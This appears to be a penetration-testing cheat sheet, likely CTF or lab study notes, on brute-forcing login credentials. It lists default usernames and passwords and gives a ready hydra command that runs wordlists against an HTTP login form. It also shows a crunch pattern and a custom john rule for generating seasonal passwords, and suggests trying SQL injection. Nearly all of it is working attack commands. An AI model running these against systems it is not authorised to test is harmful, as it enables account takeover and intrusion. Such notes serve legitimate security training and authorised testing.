# brute forcing

- Try software default credentials
- Try the following usernames

```shell
admin
root
<software-name> (e.g. cms)
```

- Try the following passwords

```shell
root
password
```

- Brute force using most common credentials

```shell
cp /usr/share/seclists/Usernames/top-usernames-shortlist.txt users.txt
cp /usr/share/seclists/Passwords/darkweb2017-top100.txt passwords.txt
hydra -f -L users.txt -P passwords.txt $ip http-post-form "/login:username=^USER^&password=^PASS^:error message."
```
- Brute force using educated passwords. Create list using `crunch` or `john`.

```shell
crunch 9 9 -t "Fall202%^" -o crunch.txt
```

```shell
└─$ tail -n 2 /etc/john/john.conf
[List.Rules:a3cipher]
Az"[0-9][0-9]" ^[!@]

john --wordlist=words.txt --rules=a3cipher --stdout > passwords.txt
```
- Try SQL injection
